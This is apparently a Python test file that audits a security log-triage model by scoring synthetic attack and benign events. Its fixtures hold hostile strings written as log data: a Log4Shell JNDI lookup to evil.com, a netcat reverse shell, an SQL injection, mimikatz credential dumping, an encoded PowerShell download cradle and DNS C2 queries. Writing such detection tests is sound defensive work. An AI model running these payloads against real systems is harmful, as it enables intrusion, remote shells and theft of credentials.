"""
CLIF Triage v7 — Comprehensive Model Accuracy Audit
======================================================
Honestly assesses whether models catch known AND anomalous attacks.

Tests 5 categories:
  1. KNOWN ATTACKS        — patterns present in training data
  2. NOVEL/ZERO-DAY       — attack patterns NOT in training data
  3. SUBTLE ATTACKS       — low-signal attacks that evade basic detection
  4. BENIGN EDGE CASES    — unusual-but-legitimate events (false positive check)
  5. AE DISCRIMINATION    — does the autoencoder add real value?

Usage:
    cd C:\\CLIF
    python tests/test_model_accuracy_audit.py
"""

import json
import os
import sys
import time

import numpy as np

# ── Patch config paths BEFORE importing triage modules
os.environ["MODEL_DIR"] = r"C:\CLIF\agents\triage\models"
os.environ["MODEL_LGBM_PATH"] = r"C:\CLIF\agents\triage\models\lgbm_v7.onnx"
os.environ["MODEL_AUTOENCODER_PATH"] = r"C:\CLIF\agents\triage\models\autoencoder_v7.onnx"
os.environ["MODEL_AE_CALIBRATION_PATH"] = r"C:\CLIF\agents\triage\models\ae_calibration_v7.json"
os.environ["FEATURE_SCALER_PATH"] = r"C:\CLIF\agents\triage\models\feature_scaler_v7.json"
os.environ["MANIFEST_PATH"] = r"C:\CLIF\agents\triage\models\manifest_v7.json"

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "agents", "triage"))

import config
config.MODEL_DIR = os.environ["MODEL_DIR"]
config.MODEL_LGBM_PATH = os.environ["MODEL_LGBM_PATH"]
config.MODEL_AUTOENCODER_PATH = os.environ["MODEL_AUTOENCODER_PATH"]
config.MODEL_AE_CALIBRATION_PATH = os.environ["MODEL_AE_CALIBRATION_PATH"]
config.FEATURE_SCALER_PATH = os.environ["FEATURE_SCALER_PATH"]
config.MANIFEST_PATH = os.environ["MANIFEST_PATH"]

from feature_extractor import FeatureExtractor, FEATURE_NAMES, NUM_FEATURES
from model_ensemble import ModelEnsemble
from ewma_tracker import EWMATracker


class _StubDrain3Miner:
    """Minimal Drain3 stub."""
    def __init__(self):
        self._counter = 0
    def mine(self, log_message: str):
        self._counter += 1
        return (f"tmpl_{self._counter}", log_message[:50], 0.5)
    def get_stats(self):
        return {"clusters": self._counter}


# ═══════════════════════════════════════════════════════════════════════════
#  TEST EVENTS — organized by category
# ═══════════════════════════════════════════════════════════════════════════

# Topic mapping (same as training)
TOPIC_MAP = {
    "linux_auth": "security-events",
    "active_directory": "security-events",
    "windows_event": "security-events",
    "netflow": "network-events",
    "ids_ips": "network-events",
    "firewall": "network-events",
    "dns": "raw-logs",
    "cloudtrail": "raw-logs",
    "kubernetes": "raw-logs",
    "web_server": "raw-logs",
}


# ─── CATEGORY 1: KNOWN ATTACKS (in training distribution) ─────────────────

KNOWN_ATTACKS = [
    {
        "name": "SSH brute force (root, 3AM, 45 failures)",
        "min_score": 0.40,
        "event": {
            "timestamp": "2026-03-16T03:15:00Z",
            "hostname": "web-prod-01", "user": "root",
            "source_type": "linux_auth", "severity": "error",
            "message": "Failed password for root from 203.0.113.50 port 22 ssh2: 45 failed attempts",
            "message_body": "Failed password for root from 203.0.113.50 port 22 ssh2: 45 failed attempts",
            "src_ip": "203.0.113.50", "dst_ip": "10.14.17.100",
            "dst_port": 22, "protocol": "tcp",
        },
    },
    {
        "name": "Suspicious service install (EventID 7045, midnight)",
        "min_score": 0.40,
        "event": {
            "timestamp": "2026-03-16T00:15:00Z",
            "hostname": "DC-PROD-01", "user": "CORP\\svc-backup",
            "source_type": "windows_event", "severity": "warning",
            "windows_event_id": 7045, "EventID": 7045, "event_id": "7045",
            "message": "A service was installed in the system. Service Name: backdoor_svc",
            "message_body": "A service was installed in the system. Service Name: backdoor_svc Service File Name: C:\\Windows\\Temp\\payload.exe",
        },
    },
    {
        "name": "SQL injection in web request",
        "min_score": 0.40,
        "event": {
            "timestamp": "2026-03-16T04:30:00Z",
            "hostname": "web-app-02", "user": "anonymous",
            "source_type": "web_server", "severity": "error",
            "message": "GET /login?user=admin'-- OR 1=1 HTTP/1.1 500",
            "message_body": "198.51.100.42 - - \"GET /login?user=admin'-- OR 1=1; DROP TABLE users--&pass=x HTTP/1.1\" 500 3421 \"sqlmap/1.6\"",
            "src_ip": "198.51.100.42", "dst_ip": "10.14.17.100",
            "dst_port": 443, "protocol": "tcp",
        },
    },
    {
        "name": "Kerberoasting (EventID 4769, RC4 encryption)",
        "min_score": 0.40,
        "event": {
            "timestamp": "2026-03-16T01:30:00Z",
            "hostname": "DC-PROD-01", "user": "CORP\\attacker-user",
            "source_type": "active_directory", "severity": "warning",
            "windows_event_id": 4769, "EventID": 4769, "event_id": "4769",
            "message": "Kerberos service ticket requested with RC4_HMAC_MD5 encryption",
            "message_body": "A Kerberos service ticket was requested. Account: attacker-user Domain: CORP Service: MSSQLSvc/sql-prod Encryption Type: 0x17 (RC4_HMAC_MD5)",
        },
    },
    {
        "name": "Firewall DDoS-like flood (port scan)",
        "min_score": 0.30,
        "event": {
            "timestamp": "2026-03-16T02:00:00Z",
            "hostname": "fw-edge-01", "source_type": "firewall", "severity": "warning",
            "message": "DENY TCP SYN flood from 198.51.100.99 to 10.14.17.0/24 ports 1-65535 rate=5000/s",
            "message_body": "DENY TCP 198.51.100.99:rand -> 10.14.17.100:445 SYN rate=5000/s attack=portscan",
            "src_ip": "198.51.100.99", "dst_ip": "10.14.17.100",
            "dst_port": 445, "protocol": "tcp",
        },
    },
    {
        "name": "Account created (EventID 4720, off-hours)",
        "min_score": 0.40,
        "event": {
            "timestamp": "2026-03-16T03:45:00Z",
            "hostname": "DC-PROD-01", "user": "CORP\\compromised-admin",
            "source_type": "windows_event", "severity": "warning",
            "windows_event_id": 4720, "EventID": 4720, "event_id": "4720",
            "message": "A user account was created: svc-backdoor",
            "message_body": "A user account was created. Subject: CORP\\compromised-admin Target: svc-backdoor",
        },
    },
    {
        "name": "Event log cleared (EventID 1102)",
        "min_score": 0.40,
        "event": {
            "timestamp": "2026-03-16T04:00:00Z",
            "hostname": "DC-PROD-01", "user": "CORP\\attacker",
            "source_type": "windows_event", "severity": "critical",
            "windows_event_id": 1102, "EventID": 1102, "event_id": "1102",
            "message": "The audit log was cleared",
            "message_body": "The audit log was cleared. Subject: Security ID: CORP\\attacker",
        },
    },
    {
        "name": "Privilege escalation (sudo to root, error)",
        "min_score": 0.30,
        "event": {
            "timestamp": "2026-03-16T02:30:00Z",
            "hostname": "db-prod-01", "user": "www-data",
            "source_type": "linux_auth", "severity": "error",
            "message": "www-data : user NOT in sudoers ; TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash",
            "message_body": "www-data : user NOT in sudoers ; TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -i",
        },
    },
]


# ─── CATEGORY 2: NOVEL/ZERO-DAY ATTACKS (NOT in training data) ────────────

NOVEL_ATTACKS = [
    {
        "name": "Log4Shell exploitation attempt",
        "min_score": 0.30,
        "event": {
            "timestamp": "2026-03-16T03:00:00Z",
            "hostname": "web-app-03", "source_type": "web_server", "severity": "error",
            "message": "GET /api/v1/search?q=${jndi:ldap://evil.com/exploit} HTTP/1.1 500",
            "message_body": "198.51.100.55 - - \"GET /api/v1/search?q=${jndi:ldap://evil.com/exploit} HTTP/1.1\" 500 0 \"-\" \"${jndi:ldap://evil.com/a}\"",
            "src_ip": "198.51.100.55", "dst_ip": "10.14.17.100",
            "dst_port": 8080, "protocol": "tcp",
        },
    },
    {
        "name": "PowerShell encoded command (living-off-the-land)",
        "min_score": 0.30,
        "event": {
            "timestamp": "2026-03-16T01:00:00Z",
            "hostname": "WORKSTATION-77", "user": "CORP\\temp-user",
            "source_type": "windows_event", "severity": "warning",
            "windows_event_id": 4688, "EventID": 4688, "event_id": "4688",
            "message": "Process created: powershell.exe -encodedcommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
            "message_body": "A new process has been created. Creator: cmd.exe Process: powershell.exe -encodedcommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
        },
    },
    {
        "name": "AWS IAM policy tampering (novel cloud attack)",
        "min_score": 0.30,
        "event": {
            "timestamp": "2026-03-16T04:15:00Z",
            "hostname": "iam.amazonaws.com", "user": "compromised-dev",
            "source_type": "cloudtrail", "severity": "warning",
            "cloud_action": "AttachUserPolicy",
            "message": "CloudTrail: compromised-dev called AttachUserPolicy — AdministratorAccess",
            "message_body": "CloudTrail: compromised-dev called AttachUserPolicy policy=arn:aws:iam::aws:policy/AdministratorAccess target=compromised-dev from 198.51.100.77",
            "src_ip": "198.51.100.77",
        },
    },
    {
        "name": "K8s container escape (privileged pod creation)",
        "min_score": 0.30,
        "event": {
            "timestamp": "2026-03-16T02:00:00Z",
            "hostname": "kube-apiserver", "user": "system:serviceaccount:default:compromised",
            "source_type": "kubernetes", "severity": "warning",
            "k8s_verb": "create", "k8s_resource": "pods", "k8s_namespace": "kube-system",
            "message": "Privileged pod created in kube-system namespace with host PID/network",
            "message_body": "K8s audit: system:serviceaccount:default:compromised create pods in kube-system hostPID=true hostNetwork=true privileged=true",
        },
    },
    {
        "name": "Reverse shell callback (Linux, netcat)",
        "min_score": 0.30,
        "event": {
            "timestamp": "2026-03-16T03:30:00Z",
            "hostname": "app-server-02", "user": "www-data",
            "source_type": "linux_auth", "severity": "error",
            "message": "Process: /bin/bash -c 'nc -e /bin/sh 198.51.100.99 4444' user=www-data escalation reverse shell",
            "message_body": "Process: /bin/bash -c 'nc -e /bin/sh 198.51.100.99 4444' user=www-data privilege escalation reverse shell backdoor",
        },
    },
    {
        "name": "Credential dumping (mimikatz-like)",
        "min_score": 0.30,
        "event": {
            "timestamp": "2026-03-16T02:15:00Z",
            "hostname": "DC-PROD-01", "user": "CORP\\attacker-admin",
            "source_type": "windows_event", "severity": "critical",
            "windows_event_id": 4672, "EventID": 4672, "event_id": "4672",
            "message": "Special privileges assigned — lsass.exe dumped mimikatz sekurlsa::logonpasswords credential dump",
            "message_body": "Special privileges assigned to new logon. Subject: CORP\\attacker-admin Process: C:\\Users\\Public\\mimikatz.exe sekurlsa::logonpasswords credential dump",
        },
    },
]


# ─── CATEGORY 3: SUBTLE/EVASIVE ATTACKS ───────────────────────────────────

SUBTLE_ATTACKS = [
    {
        "name": "Slow password spray (single fail, business hours)",
        "min_score": 0.20,  # lower threshold — truly subtle
        "event": {
            "timestamp": "2026-03-16T10:00:00Z",
            "hostname": "web-prod-01", "user": "jdoe",
            "source_type": "linux_auth", "severity": "warning",
            "message": "Failed password for jdoe from 10.14.17.50 port 54321 ssh2",
            "message_body": "Failed password for jdoe from 10.14.17.50 port 54321 ssh2",
            "src_ip": "10.14.17.50", "dst_ip": "10.14.17.100",
            "dst_port": 22, "protocol": "tcp",
        },
    },
    {
        "name": "Data staging — large upload to cloud (benign-looking)",
        "min_score": 0.15,  # very subtle
        "event": {
            "timestamp": "2026-03-16T23:45:00Z",
            "hostname": "web-lb-01", "source_type": "web_server", "severity": "info",
            "message": "POST /api/v1/upload HTTP/1.1 200 OK exfiltration large payload",
            "message_body": "10.14.17.50 - - \"POST /api/v1/upload HTTP/1.1\" 200 52428800 exfiltration payload",
            "src_ip": "10.14.17.50", "dst_ip": "10.14.17.100",
            "dst_port": 443, "protocol": "tcp",
            "bytes_sent": 52428800, "bytes_received": 200,
        },
    },
    {
        "name": "DNS TXT query with base64 data (C2 channel)",
        "min_score": 0.15,
        "event": {
            "timestamp": "2026-03-16T02:45:00Z",
            "hostname": "infected-pc-03", "user": "CORP\\temp-contractor",
            "source_type": "dns", "severity": "info",
            "dns_query_name": "aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Q.x7k2m.evil-c2.xyz",
            "message": "DNS query: aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Q.x7k2m.evil-c2.xyz TXT IN",
            "message_body": "DNS query: aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Q.x7k2m.evil-c2.xyz TXT IN",
        },
    },
    {
        "name": "Scheduled task creation (persistence, EventID 4698)",
        "min_score": 0.30,
        "event": {
            "timestamp": "2026-03-16T01:30:00Z",
            "hostname": "WORKSTATION-42", "user": "CORP\\regular-user",
            "source_type": "windows_event", "severity": "warning",
            "windows_event_id": 4698, "EventID": 4698, "event_id": "4698",
            "message": "A scheduled task was created: SystemUpdateCheck",
            "message_body": "A scheduled task was created. Task Name: \\SystemUpdateCheck Command: powershell.exe -encodedcommand hidden",
        },
    },
]


# ─── CATEGORY 4: BENIGN EDGE CASES (must NOT flag as attack) ──────────────

BENIGN_EDGE_CASES = [
    {
        "name": "Sysadmin legitimate sudo at 2 AM (maintenance window)",
        "max_score": 0.60,
        "event": {
            "timestamp": "2026-03-16T02:00:00Z",
            "hostname": "db-prod-01", "user": "dbadmin",
            "source_type": "linux_auth", "severity": "info",
            "message": "Accepted password for dbadmin from 10.14.17.10 port 55555 ssh2",
            "message_body": "pam_unix(sshd:session): session opened for user dbadmin by (uid=0)",
            "src_ip": "10.14.17.10", "dst_ip": "10.14.17.100",
            "dst_port": 22, "protocol": "tcp",
        },
    },
    {
        "name": "Normal privileged logon (EventID 4672, domain admin)",
        "max_score": 0.50,
        "event": {
            "timestamp": "2026-03-16T09:30:00Z",
            "hostname": "DC-PROD-01", "user": "CORP\\domain-admin",
            "source_type": "windows_event", "severity": "info",
            "windows_event_id": 4672, "EventID": 4672, "event_id": "4672",
            "message": "Special privileges assigned to new logon",
            "message_body": "Special privileges assigned to new logon. Subject: CORP\\domain-admin Privileges: SeBackupPrivilege SeRestorePrivilege",
        },
    },
    {
        "name": "High-traffic web API (burst of requests, not attack)",
        "max_score": 0.50,
        "event": {
            "timestamp": "2026-03-16T12:00:00Z",
            "hostname": "web-lb-01", "source_type": "web_server", "severity": "info",
            "message": "GET /api/v1/products?page=1&limit=100 HTTP/1.1 200 OK",
            "message_body": "10.14.17.50 - - \"GET /api/v1/products?page=1&limit=100 HTTP/1.1\" 200 48000 \"-\" \"Mozilla/5.0\"",
            "src_ip": "10.14.17.50", "dst_ip": "10.14.17.100",
            "dst_port": 443, "protocol": "tcp",
        },
    },
    {
        "name": "DNS query for long CDN domain (not exfiltration)",
        "max_score": 0.50,
        "event": {
            "timestamp": "2026-03-16T10:30:00Z",
            "hostname": "dns-resolver-01", "source_type": "dns", "severity": "info",
            "dns_query_name": "d15p4nf2ernk90.cloudfront.net",
            "message": "DNS query: d15p4nf2ernk90.cloudfront.net A IN",
            "message_body": "DNS query: d15p4nf2ernk90.cloudfront.net A IN",
        },
    },
    {
        "name": "Firewall rule change during business hours (legit)",
        "max_score": 0.55,
        "event": {
            "timestamp": "2026-03-16T14:00:00Z",
            "hostname": "fw-edge-01", "source_type": "firewall", "severity": "info",
            "message": "ALLOW TCP 10.14.17.0/24 -> 0.0.0.0/0:443 HTTPS outbound policy-update",
            "message_body": "ALLOW TCP 10.14.17.0/24 -> 0.0.0.0/0:443 HTTPS outbound rule=corporate-web-access admin=net-ops",
            "src_ip": "10.14.17.0", "dst_ip": "0.0.0.0",
            "dst_port": 443, "protocol": "tcp",
        },
    },
    {
        "name": "K8s normal pod scaling (benign autoscaler)",
        "max_score": 0.50,
        "event": {
            "timestamp": "2026-03-16T11:00:00Z",
            "hostname": "kube-apiserver", "user": "system:serviceaccount:kube-system:horizontal-pod-autoscaler",
            "source_type": "kubernetes", "severity": "info",
            "k8s_verb": "update", "k8s_resource": "deployments", "k8s_namespace": "production",
            "message": "Autoscaler updated deployment replicas from 3 to 5",
            "message_body": "K8s audit: system:serviceaccount:kube-system:horizontal-pod-autoscaler update deployments/scale in production replicas=5",
        },
    },
]


# ═══════════════════════════════════════════════════════════════════════════
#  RUNNER
# ═══════════════════════════════════════════════════════════════════════════

def score_event(extractor, ensemble, event):
    """Extract features and score a single event."""
    source_type = event.get("source_type", "unknown")
    topic = TOPIC_MAP.get(source_type, "raw-logs")
    feat_dict = extractor.extract(event, topic=topic)
    feature_vec = np.array(
        [feat_dict.get(name, 0.0) for name in FEATURE_NAMES],
        dtype=np.float32,
    ).reshape(1, -1)
    model_scores = ensemble.predict_batch(feature_vec, [source_type])
    return {
        "lgbm": float(model_scores["lgbm_scores"][0]),
        "ae": float(model_scores["ae_scores"][0]),
        "combined": float(model_scores["combined"][0]),
        "features": feat_dict,
    }


def classify(score):
    if score >= config.DEFAULT_ANOMALOUS_THRESHOLD:
        return "escalate"
    elif score >= config.DEFAULT_SUSPICIOUS_THRESHOLD:
        return "monitor"
    return "discard"


def run_audit():
    print("=" * 80)
    print("  CLIF Triage v7 — COMPREHENSIVE MODEL ACCURACY AUDIT")
    print("=" * 80)

    # Init
    ensemble = ModelEnsemble()
    ensemble.load()
    drain3_stub = _StubDrain3Miner()
    ewma = EWMATracker()
    extractor = FeatureExtractor(drain3_miner=drain3_stub, ewma_tracker=ewma)

    results_by_category = {}
    total_pass = 0
    total_fail = 0

    # ═══════════════════════════════════════════════════════════════════
    #  CATEGORY 1: KNOWN ATTACKS
    # ═══════════════════════════════════════════════════════════════════
    print("\n" + "─" * 80)
    print("  CATEGORY 1: KNOWN ATTACKS (must detect, min_score threshold)")
    print("─" * 80)

    cat1_pass, cat1_fail = 0, 0
    cat1_results = []
    for tc in KNOWN_ATTACKS:
        r = score_event(extractor, ensemble, tc["event"])
        passed = r["combined"] >= tc["min_score"]
        status = "PASS" if passed else "FAIL"
        if passed:
            cat1_pass += 1
        else:
            cat1_fail += 1
        label = classify(r["combined"])
        print(f"  [{status}] {tc['name']}")
        print(f"         LGBM={r['lgbm']:.4f}  AE={r['ae']:.4f}  Combined={r['combined']:.4f}  "
              f"Label={label}  (min={tc['min_score']:.2f})")
        cat1_results.append({"name": tc["name"], "passed": passed, **r})

    results_by_category["KNOWN_ATTACKS"] = cat1_results

    # ═══════════════════════════════════════════════════════════════════
    #  CATEGORY 2: NOVEL / ZERO-DAY ATTACKS
    # ═══════════════════════════════════════════════════════════════════
    print("\n" + "─" * 80)
    print("  CATEGORY 2: NOVEL / ZERO-DAY ATTACKS (not in training data)")
    print("─" * 80)

    cat2_pass, cat2_fail = 0, 0
    cat2_results = []
    for tc in NOVEL_ATTACKS:
        r = score_event(extractor, ensemble, tc["event"])
        passed = r["combined"] >= tc["min_score"]
        status = "PASS" if passed else "FAIL"
        if passed:
            cat2_pass += 1
        else:
            cat2_fail += 1
        label = classify(r["combined"])
        print(f"  [{status}] {tc['name']}")
        print(f"         LGBM={r['lgbm']:.4f}  AE={r['ae']:.4f}  Combined={r['combined']:.4f}  "
              f"Label={label}  (min={tc['min_score']:.2f})")
        cat2_results.append({"name": tc["name"], "passed": passed, **r})

    results_by_category["NOVEL_ATTACKS"] = cat2_results

    # ═══════════════════════════════════════════════════════════════════
    #  CATEGORY 3: SUBTLE / EVASIVE ATTACKS
    # ═══════════════════════════════════════════════════════════════════
    print("\n" + "─" * 80)
    print("  CATEGORY 3: SUBTLE / EVASIVE ATTACKS (low signal, hard to catch)")
    print("─" * 80)

    cat3_pass, cat3_fail = 0, 0
    cat3_results = []
    for tc in SUBTLE_ATTACKS:
        r = score_event(extractor, ensemble, tc["event"])
        passed = r["combined"] >= tc["min_score"]
        status = "PASS" if passed else "FAIL"
        if passed:
            cat3_pass += 1
        else:
            cat3_fail += 1
        label = classify(r["combined"])
        print(f"  [{status}] {tc['name']}")
        print(f"         LGBM={r['lgbm']:.4f}  AE={r['ae']:.4f}  Combined={r['combined']:.4f}  "
              f"Label={label}  (min={tc['min_score']:.2f})")
        cat3_results.append({"name": tc["name"], "passed": passed, **r})

    results_by_category["SUBTLE_ATTACKS"] = cat3_results

    # ═══════════════════════════════════════════════════════════════════
    #  CATEGORY 4: BENIGN EDGE CASES (false positive check)
    # ═══════════════════════════════════════════════════════════════════
    print("\n" + "─" * 80)
    print("  CATEGORY 4: BENIGN EDGE CASES (must NOT score too high)")
    print("─" * 80)

    cat4_pass, cat4_fail = 0, 0
    cat4_results = []
    for tc in BENIGN_EDGE_CASES:
        r = score_event(extractor, ensemble, tc["event"])
        passed = r["combined"] <= tc["max_score"]
        status = "PASS" if passed else "FAIL"
        if passed:
            cat4_pass += 1
        else:
            cat4_fail += 1
        label = classify(r["combined"])
        print(f"  [{status}] {tc['name']}")
        print(f"         LGBM={r['lgbm']:.4f}  AE={r['ae']:.4f}  Combined={r['combined']:.4f}  "
              f"Label={label}  (max={tc['max_score']:.2f})")
        cat4_results.append({"name": tc["name"], "passed": passed, **r})

    results_by_category["BENIGN_EDGE_CASES"] = cat4_results

    # ═══════════════════════════════════════════════════════════════════
    #  CATEGORY 5: AE DISCRIMINATION ANALYSIS
    # ═══════════════════════════════════════════════════════════════════
    print("\n" + "─" * 80)
    print("  CATEGORY 5: AUTOENCODER DISCRIMINATION ANALYSIS")
    print("─" * 80)

    # Collect all AE scores from above
    all_attack_ae = []
    all_benign_ae = []
    all_attack_lgbm = []
    all_benign_lgbm = []

    for cat_key in ("KNOWN_ATTACKS", "NOVEL_ATTACKS", "SUBTLE_ATTACKS"):
        for r in results_by_category[cat_key]:
            all_attack_ae.append(r["ae"])
            all_attack_lgbm.append(r["lgbm"])

    for r in results_by_category["BENIGN_EDGE_CASES"]:
        all_benign_ae.append(r["ae"])
        all_benign_lgbm.append(r["lgbm"])

    attack_ae_mean = np.mean(all_attack_ae)
    benign_ae_mean = np.mean(all_benign_ae)
    ae_gap = attack_ae_mean - benign_ae_mean

    attack_lgbm_mean = np.mean(all_attack_lgbm)
    benign_lgbm_mean = np.mean(all_benign_lgbm)
    lgbm_gap = attack_lgbm_mean - benign_lgbm_mean

    print(f"\n  LightGBM scores:")
    print(f"    Benign mean:  {benign_lgbm_mean:.4f}  (min={min(all_benign_lgbm):.4f}, max={max(all_benign_lgbm):.4f})")
    print(f"    Attack mean:  {attack_lgbm_mean:.4f}  (min={min(all_attack_lgbm):.4f}, max={max(all_attack_lgbm):.4f})")
    print(f"    Gap:          {lgbm_gap:+.4f}")

    print(f"\n  Autoencoder scores:")
    print(f"    Benign mean:  {benign_ae_mean:.4f}  (min={min(all_benign_ae):.4f}, max={max(all_benign_ae):.4f})")
    print(f"    Attack mean:  {attack_ae_mean:.4f}  (min={min(all_attack_ae):.4f}, max={max(all_attack_ae):.4f})")
    print(f"    Gap:          {ae_gap:+.4f}")

    ae_discriminates = ae_gap > 0.10
    ae_verdict = "USEFUL" if ae_discriminates else "NOT USEFUL (attack ≈ benign)"
    print(f"\n  AE Discrimination: {ae_verdict}")

    # Check how many times AE disagrees with LGBM in a useful way
    ae_catches_lgbm_misses = 0
    ae_hurts = 0
    for cat_key in ("KNOWN_ATTACKS", "NOVEL_ATTACKS", "SUBTLE_ATTACKS"):
        for r in results_by_category[cat_key]:
            if r["lgbm"] < 0.40 and r["ae"] > 0.50:
                ae_catches_lgbm_misses += 1
    for r in results_by_category["BENIGN_EDGE_CASES"]:
        combined_without_ae = r["lgbm"] * config.LGBM_WEIGHT
        combined_with_ae = r["combined"]
        if combined_with_ae >= 0.40 and combined_without_ae < 0.40:
            ae_hurts += 1

    print(f"  AE catches LGBM misses: {ae_catches_lgbm_misses} times")
    print(f"  AE causes false positives: {ae_hurts} times")

    # ═══════════════════════════════════════════════════════════════════
    #  FINAL SUMMARY
    # ═══════════════════════════════════════════════════════════════════
    total_pass = cat1_pass + cat2_pass + cat3_pass + cat4_pass
    total_fail = cat1_fail + cat2_fail + cat3_fail + cat4_fail
    total = total_pass + total_fail

    print("\n" + "=" * 80)
    print("  AUDIT SUMMARY")
    print("=" * 80)
    print(f"\n  {'Category':<35} {'Pass':>5} {'Fail':>5} {'Rate':>8}")
    print(f"  {'─' * 55}")
    print(f"  {'Known Attacks':<35} {cat1_pass:>5} {cat1_fail:>5} {cat1_pass/(cat1_pass+cat1_fail)*100:>7.1f}%")
    print(f"  {'Novel/Zero-Day Attacks':<35} {cat2_pass:>5} {cat2_fail:>5} {cat2_pass/(cat2_pass+cat2_fail)*100:>7.1f}%")
    print(f"  {'Subtle/Evasive Attacks':<35} {cat3_pass:>5} {cat3_fail:>5} {cat3_pass/(cat3_pass+cat3_fail)*100:>7.1f}%")
    print(f"  {'Benign Edge Cases (FP check)':<35} {cat4_pass:>5} {cat4_fail:>5} {cat4_pass/(cat4_pass+cat4_fail)*100:>7.1f}%")
    print(f"  {'─' * 55}")
    print(f"  {'TOTAL':<35} {total_pass:>5} {total_fail:>5} {total_pass/total*100:>7.1f}%")

    print("\n  HONEST ASSESSMENT:")
    issues = []
    if cat1_fail > 0:
        issues.append(f"  - {cat1_fail} known attack(s) missed — LightGBM feature gaps")
    if cat2_fail > 0:
        issues.append(f"  - {cat2_fail} novel attack(s) missed — generalization weakness")
    if cat3_fail > 0:
        issues.append(f"  - {cat3_fail} subtle attack(s) missed — expected for single-event analysis")
    if cat4_fail > 0:
        issues.append(f"  - {cat4_fail} benign event(s) false-positived — overtriggering risk")
    if not ae_discriminates:
        issues.append("  - Autoencoder provides minimal discrimination (attack ≈ benign AE scores)")
    if ae_hurts > 0:
        issues.append(f"  - Autoencoder caused {ae_hurts} false positive(s) by boosting benign scores")

    if issues:
        print("  GAPS FOUND:")
        for issue in issues:
            print(issue)
    else:
        print("  No critical gaps found.")

    # Always-present notes
    print("\n  ARCHITECTURE NOTES:")
    print("  - LightGBM (weight=0.85) does the heavy lifting for KNOWN patterns")
    print("  - Autoencoder (weight=0.15) provides a small anomaly signal")
    print("  - Single-event analysis has inherent limits — subtle attacks need")
    print("    temporal accumulation (EWMA, kill-chain, cross-host correlation)")
    print("  - Score fusion boosts (kill-chain, cross-host, IOC) activate in")
    print("    production with event streams, not in cold-start single-event tests")
    print("=" * 80)

    return total_fail == 0


if __name__ == "__main__":
    success = run_audit()
    sys.exit(0 if success else 1)
